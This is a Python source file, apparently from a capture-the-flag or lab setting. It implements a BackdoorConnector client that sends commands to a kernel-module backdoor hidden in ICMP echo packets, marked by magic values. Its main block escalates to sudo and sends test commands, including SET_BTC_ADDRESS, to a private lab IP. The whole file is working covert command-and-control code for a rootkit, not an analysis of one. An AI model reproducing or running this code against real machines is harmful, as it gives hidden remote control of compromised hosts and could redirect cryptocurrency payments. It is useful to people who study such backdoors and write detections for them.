import os
import random
import select
import socket
import struct
import sys
import time
from typing import Optional

"""
Based on: https://gist.github.com/pklaus/856268
"""

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_RESPONSE = 0
ICMP_CODE = socket.getprotobyname('icmp')
MAGIC_VALUE = struct.pack('<I', 0xdeadbeef)


class BackdoorConnector:
    def __init__(self, target: str, verbose: bool = False, error_class=AssertionError):
        self.target = socket.gethostbyname(target)
        self.socket = None
        self.verbose = verbose
        self.error_class = error_class

    def __enter__(self) -> 'BackdoorConnector':
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.socket:
            self.socket.close()
        self.socket = None

    @staticmethod
    def checksum(packet: bytes):
        if len(packet) % 2 == 1:
            packet += b'\x00'
        s = 0
        for i in range(0, len(packet), 2):
            w = packet[i] + (packet[i+1] << 8)
            c = s + w
            s = (c & 0xffff) + (c >> 16)
        return ~s & 0xffff

    def create_packet(self, packet_id: int, data: bytes) -> bytes:
        header = struct.pack('!bbHHh', ICMP_ECHO_REQUEST, 0, 0, packet_id, 1)
        my_checksum = self.checksum(header + data)
        header = struct.pack('!bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), packet_id, 1)
        return header + data

    def receive_ping(self, packet_id, time_sent, timeout):
        expected_src_addr = socket.inet_aton(self.target)
        # Receive the ping from the socket.
        time_left = timeout
        while True:
            started_select = time.time()
            ready = select.select([self.socket], [], [], time_left)
            how_long_in_select = time.time() - started_select
            if not ready[0]:
                return None, None
            time_received = time.time()
            packet, addr = self.socket.recvfrom(4096)
            # is this the IP packet we might be looking for?
            if packet[9] != 1:
                print('[*] Invalid protocol', packet[9])
                continue
            if packet[12:16] != expected_src_addr:
                print('[*] Wrong source address:', packet[12:16], expected_src_addr)
                continue
            icmp_offset = (packet[0] & 0xf) * 4
            # check ICMP checksum
            if self.checksum(packet[icmp_offset:]) != 0:
                print('[*] Invalid checksum!', hex(self.checksum(packet[icmp_offset:])))
                continue
            icmp_header = packet[20:28]
            type, code, checksum, received_packet_id, sequence = struct.unpack('!bbHHh', icmp_header)
            if type == ICMP_ECHO_RESPONSE and received_packet_id == packet_id and len(packet) >= 32:
                if packet[28:32] == b'\xef\xbe\xad\xde':
                    print('[*] (received regular response, kernel module not active)')
                elif packet[28:32] == b'\xde\xc0\xad\xde':
                    return time_received - time_sent, packet[32:]
                else:
                    print('[*] (received stray invalid response:)', packet[28:])
            time_left -= time_received - time_sent
            if time_left <= 0:
                return None, None

    def command(self, cmd: bytes, timeout=1.0, tries=2) -> Optional[bytes]:
        packet_id = int(random.randint(0, 0x10000))
        packet = self.create_packet(packet_id, MAGIC_VALUE + cmd)
        for i in range(tries):
            sent = self.socket.sendto(packet, (self.target, 1))
            if sent != len(packet):
                print(f'[!] Request not fully sent: {sent} / {len(packet)} bytes')
            if self.verbose:
                print('>', cmd)
            dt, data = self.receive_ping(packet_id, time.time(), timeout)
            if dt is not None:
                # print(f'[*] Received response in {dt:.3f} seconds: {len(data)} bytes')
                if self.verbose:
                    print('<', data)
                return data
        if self.verbose:
            print('< (no response)')
        return None

    def check_command(self, cmd: bytes, timeout=1.0, tries=2) -> bytes:
        response = self.command(cmd, timeout, tries)
        if not response:
            raise self.error_class('Unanswered: ' + cmd.split(b'\x00')[0].decode())
        return response


if __name__ == '__main__':
    if os.getuid() == 1000:
        cmd = ['/usr/bin/sudo', 'python3', '-u'] + sys.argv
        if 'PYTHONPATH' in os.environ:
            cmd = ['/usr/bin/sudo', 'PYTHONPATH='+os.environ['PYTHONPATH'], 'python3', '-u'] + sys.argv
        os.execv('/usr/bin/sudo', cmd)
    with BackdoorConnector('192.168.56.101') as connector:
        data = connector.command(b'PING\x00AND_SOME_MORE_SHIT')
        print(repr(data))
        time.sleep(1)
        data = connector.command(b'SET_BTC_ADDRESS\x00SAAR{TestAddress}')
        print(repr(data))
        time.sleep(1)
        data = connector.command(b'TEST\x00\x80')
        print(repr(data))
